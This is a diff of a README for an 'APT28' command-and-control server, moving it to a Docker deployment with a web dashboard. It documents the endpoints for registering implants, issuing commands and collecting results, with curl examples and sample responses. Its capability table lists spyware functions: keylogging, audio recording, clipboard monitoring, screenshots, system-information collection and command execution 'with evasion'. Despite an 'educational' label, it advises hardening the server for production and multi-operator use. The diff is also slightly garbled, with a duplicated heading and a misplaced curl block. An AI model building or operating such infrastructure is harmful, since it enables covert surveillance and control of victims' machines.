@@ -1,103 +1,125 @@
-# APT28 C2 Server (Python Implementation)
+# APT28 C2 Server (Docker Deployment)
 
-A Command and Control (C2) server implementation in Python using Flask. This server manages client communication, command distribution, and result collection for the APT28 malware agent.
+A Command and Control (C2) server implementation with a React-based web dashboard. This server manages client communication, command distribution, and result collection for the APT28 malware agent.
+
+**Deployment:** Docker-only (recommended for security and isolation)
 
 ## Features
 
+- **Web Dashboard**: Modern React-based UI for managing operations
 - **Client Registration**: Register and track connected malware clients
-- **Command Distribution**: Send capabilities to clients
-- **Result Collection**: Receive and store execution results
-- **Client Management**: List, query, and manage connected clients
-- **Logging**: Comprehensive logging of all activities
+- **Command Distribution**: Send capabilities to clients via web interface
+- **Result Collection**: View and analyze execution results in real-time
+- **Client Management**: Monitor client status and activity
 - **REST API**: Complete HTTP API for C2 operations
+- **Logging**: Comprehensive logging with persistent volumes
+- **Containerized**: Docker-only deployment for security and portability
 
 ## Project Structure
 
 ```
 c2_server/
 ├── app.py              # Main Flask application
+├── cli.py              # CLI management tool
 ├── requirements.txt    # Python dependencies
-├── .env.example        # Example environment configuration
-├── README.md           # This file
-└── c2_server.log       # Server logs (generated at runtime)
+├── Dockerfile          # Multi-stage Docker build
+├── docker-compose.yml  # Docker Compose configuration
+├── frontend/           # React dashboard
+│   ├── src/
+│   │   ├── App.js
+│   │   ├── api.js
+│   │   ├── components/
+│   │   │   ├── Dashboard.js
+│   │   │   ├── Clients.js
+│   │   │   ├── Commands.js
+│   │   │   └── Results.js
+│   │   └── index.css
+│   ├── public/
+│   └── package.json
+├── logs/               # Server logs (created at runtime)
+└── README.md           # This file
 ```
 
-## Installation
+## Quick Start (Docker)
+
+## Quick Start (Docker)
 
 ### Prerequisites
-- Python 3.8+
-- pip (Python package manager)
+- Docker (20.10+)
+- Docker Compose (1.29+)
 
-### Setup
+### Build and Run
 
 1. Navigate to the c2_server directory:
 ```bash
 cd /workspaces/APT28/c2_server
 ```
 
-2. Install dependencies:
+2. Build and start the server:
 ```bash
-pip install -r requirements.txt
+docker-compose up --build
 ```
 
-3. (Optional) Configure environment variables:
+3. Access the web dashboard:
+```
+http://localhost:8080
+```
+
+The server will automatically build the React frontend and serve it alongside the API.
+
+### Running in Background
+
 ```bash
-cp .env.example .env
-# Edit .env with your desired configuration
+docker-compose up -d
 ```
 
-## Running the Server
+### View Logs
 
-### Standard Development Mode
 ```bash
-python app.py
+docker-compose logs -f
 ```
 
-The server will start on `http://0.0.0.0:8080` by default.
+### Stop the Server
 
-### Production Mode with Gunicorn
 ```bash
-gunicorn --bind 0.0.0.0:8080 --workers 4 app:app
+docker-compose down
 ```
 
-### With Custom Configuration
+### Rebuild After Changes
+
 ```bash
-# Using environment variables
-export C2_HOST=127.0.0.1
-export C2_PORT=5000
-export DEBUG=True
-python app.py
+docker-compose up --build --force-recreate
 ```
 
-## API Endpoints
+## Web Dashboard
 
-### 1. Client Registration
-**Endpoint:** `GET /api/register?id=<client_id>`
+The React-based dashboard provides:
 
-**Purpose:** Register a new client
+- **Dashboard**: Overview of connected clients, active sessions, and results
+- **Clients**: View all registered clients with status and activity
+- **Commands**: Send capability commands to specific clients
+- **Results**: View and analyze execution results in real-time
 
-**Example:**
-```bash
-curl "http://localhost:8080/api/register?id=APT28_1234_1701619200"
+Navigate to `http://localhost:8080` after starting the server.
+
+## Configuration
+
+Environment variables can be set in `docker-compose.yml`:
+
+```yaml
+environment:
+  - C2_HOST=0.0.0.0
+  - C2_PORT=8080
+  - DEBUG=False
+  - FLASK_ENV=production
 ```
 
-**Response:**
-```json
-{
-  "status": "registered",
-  "id": "APT28_1234_1701619200",
-  "message": "Client successfully registered"
-}
-```
+## Persistent Data
 
----
+The following directories are persisted via Docker volumes:
 
-### 2. Get Command
-**Endpoint:** `GET /api/command?id=<client_id>`
-
-**Purpose:** Retrieve pending capability command for a client
-
-**Example:**
+- `/app/logs` - Server logs (mapped to `./logs`)
+- `/app/data` - Application data (Docker volume `c2_data`)
 ```bash
 curl "http://localhost:8080/api/command?id=APT28_1234_1701619200"
 ```
@@ -176,235 +198,107 @@ curl "http://localhost:8080/api/clients"
 
 **Purpose:** Get execution results
 
-**Parameters:**
-- `limit` (optional): Maximum number of results to return (default: 100)
+## API Endpoints
 
-**Example:**
+Access the API at `http://localhost:8080/api/`
+
+For detailed API documentation, see the web dashboard or use:
 ```bash
-curl "http://localhost:8080/api/results?limit=10"
+curl "http://localhost:8080/api/"
 ```
 
-**Response:**
-```json
-{
-  "count": 5,
-  "results": [
-    {
-      "client": "APT28_1234_1701619200",
-      "capability": 1,
-      "result": "executed",
-      "timestamp": "2025-12-03T10:35:45",
-      "ip": "192.168.1.100"
-    }
-  ]
-}
-```
+### Key Endpoints
 
----
-
-### 6. Send Command to Client
-**Endpoint:** `POST /api/send_command`
-
-**Purpose:** Send a capability command to a specific client
-
-**Body:**
-```json
-{
-  "client_id": "APT28_1234_1701619200",
-  "capability_id": 1
-}
-```
-
-**Example:**
-```bash
-curl -X POST http://localhost:8080/api/send_command \
-  -H "Content-Type: application/json" \
-  -d '{"client_id":"APT28_1234_1701619200","capability_id":1}'
-```
-
-**Response:**
-```json
-{
-  "status": "success",
-  "message": "Capability 1 assigned to APT28_1234_1701619200",
-  "client_id": "APT28_1234_1701619200",
-  "capability_id": 1,
-  "capability_name": "Audio Recorder (start_audio_recorder)"
-}
-```
-
----
-
-### 7. Get Client Details
-**Endpoint:** `GET /api/client/<client_id>`
-
-**Purpose:** Get details of a specific client
-
-**Example:**
-```bash
-curl "http://localhost:8080/api/client/APT28_1234_1701619200"
-```
-
-**Response:**
-```json
-{
-  "status": "success",
-  "client": {
-    "id": "APT28_1234_1701619200",
-    "registered_at": "2025-12-03T10:30:00",
-    "last_seen": "2025-12-03T10:35:45",
-    "ip": "192.168.1.100",
-    "status": "active"
-  },
-  "pending_command": 0
-}
-```
-
----
-
-### 8. Get Client Results
-**Endpoint:** `GET /api/client/<client_id>/results`
-
-**Purpose:** Get all results from a specific client
-
-**Example:**
-```bash
-curl "http://localhost:8080/api/client/APT28_1234_1701619200/results"
-```
-
-**Response:**
-```json
-{
-  "status": "success",
-  "client_id": "APT28_1234_1701619200",
-  "count": 3,
-  "results": [...]
-}
-```
-
----
-
-### 9. Health Check
-**Endpoint:** `GET /api/health`
-
-**Purpose:** Server health and status check
-
-**Example:**
-```bash
-curl "http://localhost:8080/api/health"
-```
-
-**Response:**
-```json
-{
-  "status": "healthy",
-  "timestamp": "2025-12-03T10:35:45",
-  "clients_count": 2,
-  "results_count": 15
-}
-```
-
----
-
-### 10. Server Info
-**Endpoint:** `GET /`
-
-**Purpose:** Get server information and available endpoints
-
-**Example:**
-```bash
-curl "http://localhost:8080/"
-```
-
-**Response:**
-```json
-{
-  "name": "APT28 C2 Server",
-  "version": "1.0.0",
-  "status": "running",
-  "timestamp": "2025-12-03T10:35:45",
-  "endpoints": {...}
-}
-```
+| Method | Endpoint | Purpose |
+|--------|----------|---------|
+| GET | `/api/register?id=<id>` | Register new client |
+| GET | `/api/command?id=<id>` | Fetch command for client |
+| POST | `/api/report` | Submit execution result |
+| POST | `/api/send_command` | Send command to client |
+| GET | `/api/clients` | List all clients |
+| GET | `/api/results` | List all results |
+| GET | `/api/health` | Server health check |
 
 ## Capability IDs
 
 | ID | Name | Description |
 |---|---|---|
 | 0 | No Command | Idle state (default) |
-| 1 | Audio Recorder | start_audio_recorder() |
-| 2 | Clipboard Monitor | start_clipboard_monitor() |
-| 3 | Keylogger | start_keylogger() |
-| 4 | Screenshot | start_screenshot() |
-| 5 | Info Collector | start_info_collector() |
+| 1 | Audio Recorder | Record from microphone |
+| 2 | Clipboard Monitor | Monitor clipboard |
+| 3 | Keylogger | Capture keystrokes |
+| 4 | Screenshot | Capture screen |
+| 5 | Info Collector | System information |
+| 6 | Command Executor | Execute commands with evasion |
 
-## Usage Example
+## Using the Web Dashboard
 
-### 1. Start the C2 Server
+1. **Dashboard Tab**: View overview statistics and system information
+2. **Clients Tab**: Monitor connected clients and their status
+3. **Commands Tab**: Send capability commands to clients
+4. **Results Tab**: View execution results in real-time
+
+## CLI Management
+
+Use the CLI tool for advanced operations:
+
 ```bash
-python app.py
+docker exec -it apt28_c2_server python cli.py --help
 ```
 
-### 2. Client Registers
+## Logs
+
+View logs in real-time:
+
 ```bash
-curl "http://localhost:8080/api/register?id=APT28_1234_1701619200"
+# Container logs
+docker-compose logs -f
+
+# Application logs
+docker exec -it apt28_c2_server tail -f /app/logs/c2_server.log
 ```
-
-### 3. Send Command to Client
-```bash
-curl -X POST http://localhost:8080/api/send_command \
-  -H "Content-Type: application/json" \
-  -d '{"client_id":"APT28_1234_1701619200","capability_id":4}'
-```
-
-### 4. Client Fetches Command
-```bash
-curl "http://localhost:8080/api/command?id=APT28_1234_1701619200"
-```
-
-### 5. Client Reports Result
-```bash
-curl -X POST http://localhost:8080/api/report \
-  -H "Content-Type: application/json" \
-  -d '{"id":"APT28_1234_1701619200","capability":4,"result":"Screenshot captured: 1920x1080"}'
-```
-
-### 6. View Results
-```bash
-curl "http://localhost:8080/api/results"
-```
-
-## Logging
-
-The server logs all activities to both console and `c2_server.log`:
-
-- Client registrations
-- Command distributions
-- Result reports
-- Errors and warnings
-- Debug information (when DEBUG=True)
 
 ## Security Considerations
 
-⚠️ **Warning:** This is a demonstration/educational implementation. For production use, consider:
+⚠️ **Warning:** This is a demonstration/educational implementation.
 
-1. **Authentication**: Implement API key or token-based authentication
-2. **Encryption**: Use HTTPS/TLS for all communications
-3. **Rate Limiting**: Implement rate limiting to prevent abuse
-4. **Input Validation**: More strict validation of all inputs
-5. **Database**: Use a database instead of in-memory storage
-6. **Access Control**: Implement role-based access control
-7. **Firewall**: Restrict access to trusted networks only
+**For production deployment:**
 
-## Development
+1. **Authentication**: Implement API key authentication
+2. **Encryption**: Use HTTPS/TLS (configure reverse proxy)
+3. **Network Isolation**: Use Docker networks and firewall rules
+4. **Rate Limiting**: Add rate limiting middleware
+5. **Database**: Replace in-memory storage with persistent database
+6. **Access Control**: Implement RBAC for multi-operator scenarios
+7. **Monitoring**: Add intrusion detection and monitoring
 
-### Running Tests
+## Troubleshooting
+
+### Container won't start
 ```bash
-python -m pytest tests/
+# Check logs
+docker-compose logs
+
+# Rebuild from scratch
+docker-compose down -v
+docker-compose up --build
 ```
 
-### Code Style
-Follow PEP 8 style guidelines.
+### Frontend not loading
+```bash
+# Verify static files were built
+docker exec -it apt28_c2_server ls -la /app/static
+
+# Rebuild with no cache
+docker-compose build --no-cache
+```
+
+### Port already in use
+```bash
+# Change port in docker-compose.yml
+ports:
+  - "9090:8080"  # Use port 9090 instead
+```
 
 ## License
 
